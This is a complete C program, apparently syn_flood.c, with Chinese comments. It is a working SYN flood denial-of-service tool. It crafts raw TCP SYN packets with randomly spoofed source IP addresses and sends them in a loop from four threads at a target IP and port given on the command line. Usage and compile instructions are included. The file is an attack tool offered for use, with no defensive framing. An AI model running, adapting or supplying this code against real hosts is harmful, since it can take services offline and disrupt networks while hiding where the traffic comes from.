#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#include <signal.h>

#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include <netdb.h>
#include <pthread.h>

#define MAXCHILD 4

static int alive = 1;

static int sockfd = -1;
static struct sockaddr_in daddr;
pthread_t pthread[MAXCHILD];

struct iphdr
{
    unsigned int ihl:4;             /* 首部长度, 无选项时, 其值为 0101 */
    unsigned int version:4;         /* 版本, 0100 表示 IPV4 */
    uint8_t tos;                    /* 服务类型 */
    uint16_t tot_len;               /* 报文总长度 */
    uint16_t id;                    /* 标识 */
    uint16_t frag_off;              /* 标志与偏移 */
    uint8_t ttl;                    /* 生存时间 */
    uint8_t protocol;               /* 协议代码 */
    uint16_t check;                 /* 头部校验和 */
    uint32_t saddr;                 /* 源地址 */
    uint32_t daddr;                 /* 目的地址 */
};

struct tcphdr
{
    uint16_t source;
    uint16_t dest;
    uint32_t seq;
    uint32_t ack_seq;
	uint16_t res1:4;
	uint16_t doff:4;
	uint16_t fin:1;
	uint16_t syn:1;
	uint16_t rst:1;
	uint16_t psh:1;
	uint16_t ack:1;
	uint16_t urg:1;
	uint16_t res2:2;
    uint16_t window;
    uint16_t check;
    uint16_t urg_ptr;
};

struct pseudohdr {
    uint32_t      saddr;
    uint32_t      daddr;
    uint8_t       pad;
    uint8_t       protocol;
    uint16_t      len;
};

static int myrandom(int min, int max)
{
    return (min + rand() % (max - min + 1));
}

static void rand_ipaddr(char ipaddr[], int len)
{
    uint8_t a = myrandom(0, 255);
    uint8_t b = myrandom(0, 255);
    uint8_t c = myrandom(0, 255);
    uint8_t d = myrandom(0, 255);

    snprintf(ipaddr, len, "%u.%u.%u.%u", a, b, c, d);

    return;
}

unsigned short  check_sum(unsigned short *buffer, unsigned short size)
{
    unsigned long cksum = 0;

    while (size > 1) {
        cksum += *buffer++;
        size  -= sizeof(unsigned short);
    }

    if (size) {
        cksum += *(unsigned char *)buffer;
    }

    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);

    return (unsigned short )(~cksum);
}

static void init_iphdr(struct iphdr *iphdr)
{
#define IP_DF 0x4000 /* 报文不分片 */
    iphdr->version = 0x4;
    iphdr->ihl = 0x5;
    iphdr->tos = 0x0;
    int len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iphdr->tot_len = htons(len);
    iphdr->id = htons(0x1);
    iphdr->frag_off = htons(IP_DF);
    iphdr->ttl = 0xFF;
    iphdr->protocol = IPPROTO_TCP;
    iphdr->check = 0x0;
    char ipaddr[16];
    rand_ipaddr(ipaddr, sizeof(ipaddr));
    iphdr->saddr = inet_addr(ipaddr);
    iphdr->daddr = daddr.sin_addr.s_addr;

    return;
}

static void init_tcphdr(struct tcphdr *tcphdr)
{
    tcphdr->source = htons(myrandom(1024, 65535));
    tcphdr->dest = daddr.sin_port;
    tcphdr->seq = 0x1;
    tcphdr->ack_seq = 0x0;
    tcphdr->doff = sizeof(struct tcphdr) / sizeof(uint32_t);
    tcphdr->syn = 0x1;
    tcphdr->window = htons(1024);
    tcphdr->check = 0x0;
    tcphdr->urg_ptr = 0x0;

    return;
}

static void init_pseudohdr(struct pseudohdr *pseudohdr)
{
    pseudohdr->saddr = 0x0;
    pseudohdr->daddr = 0x0;
    pseudohdr->pad = 0x0;
    pseudohdr->protocol = IPPROTO_TCP;
    pseudohdr->len = htons(sizeof(struct tcphdr));
    return;
}

void sig_int(int signo)
{
    alive = 0;
    return;
}

static void phex(uint8_t* str, int len)
{
    unsigned char i;
    printf("magic : 0x");
    for (i = 0; i < len; ++i)
        printf("%.2x ", str[i]);
    printf("\n");
}

static int
create_syn_packet(char *packet, int pkt_len)
{
    char buff[512];
    struct iphdr iphdr;
    struct pseudohdr pseudohdr;
    struct tcphdr tcphdr;

    /* 初始化 IP 首部 */
    memset(&iphdr, 0x0, sizeof(iphdr));
    init_iphdr(&iphdr);
    iphdr.check = check_sum((unsigned short *)&iphdr, sizeof(iphdr));

    /* 初始化 TCP 伪首部 */
    memset(&pseudohdr, 0x0, sizeof(pseudohdr));
    init_pseudohdr(&pseudohdr);
    pseudohdr.saddr = iphdr.saddr;
    pseudohdr.daddr = iphdr.daddr;

    /* 初始化 TCP 首部 */
    memset(&tcphdr, 0x0, sizeof(tcphdr));
    init_tcphdr(&tcphdr);
    memset(buff, 0x0, sizeof(buff));
    memcpy(buff, &pseudohdr, sizeof(pseudohdr));
    memcpy(buff + sizeof(pseudohdr), &tcphdr, sizeof(tcphdr));
    tcphdr.check = check_sum((unsigned short *)buff, sizeof(pseudohdr) + sizeof(tcphdr));

    memcpy(packet, &iphdr, sizeof(iphdr));
    memcpy(packet + sizeof(iphdr), &tcphdr, sizeof(tcphdr));

    return (sizeof(iphdr) + sizeof(tcphdr));
}

void *
send_synflood(void *arg)
{
    char packet[1024];
    int len = 0;
    srand((unsigned int)time(NULL));

    while (alive)
    {
        memset(packet, 0x0, sizeof(packet));
        len = create_syn_packet(packet, sizeof(packet));

        if (sendto(sockfd, packet, len, 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) != len)
        {
            perror("sendto");
            pthread_exit("failed");
        }
    }

    return NULL;
}

static int create_raw_socket(void)
{
    int sockfd = -1;
    int on = 1;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0)
    {
        perror("socket");
        return -1;
    }

    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0)
    {
        perror("setsockopt");
        close(sockfd);
        return -1;
    }

    return sockfd;
}

int main(int argc, char *argv[])
{
    char ipaddr[16];
    unsigned short dport = 0;

    if (argc != 3)
    {
        printf("usage : ./syn_flood <IPAddress> <Port>\n");
        exit(EXIT_FAILURE);
    }
    snprintf(ipaddr, sizeof(ipaddr), "%s", argv[1]);
    dport = atoi(argv[2]);

    printf("IP 地址 : %s 端口 : %u\n", ipaddr, dport);

    /* 信号处理 */
    signal(SIGINT, sig_int);

    /* 目标地址 */
    bzero(&daddr, sizeof(daddr));
    daddr.sin_family = AF_INET;
    daddr.sin_addr.s_addr = inet_addr(ipaddr);
    daddr.sin_port = htons(dport);

    sockfd = create_raw_socket();
    if (sockfd < 0)
    {
        perror("create_raw_socket");
        exit(EXIT_FAILURE);
    }

    /* 多线程 */
    int i = 0;
    for (i = 0; i < MAXCHILD; i++)
    {
        if ( pthread_create(&pthread[i], NULL, send_synflood, NULL) != 0)
        {
            perror("pthread_create");
            close(sockfd);
            exit(EXIT_FAILURE);
        }
    }

    /* 等等线程结束 */
    for (i = 0; i < MAXCHILD; i++)
    {
        if (pthread_join(pthread[i], NULL)!= 0)
        {
            perror("pthread_join");
            close(sockfd);
            exit(EXIT_FAILURE);
        }
    }

    close(sockfd);

    exit(EXIT_SUCCESS);
}

/*
   gcc -o syn_flood syn_flood.c -lpthread
 */
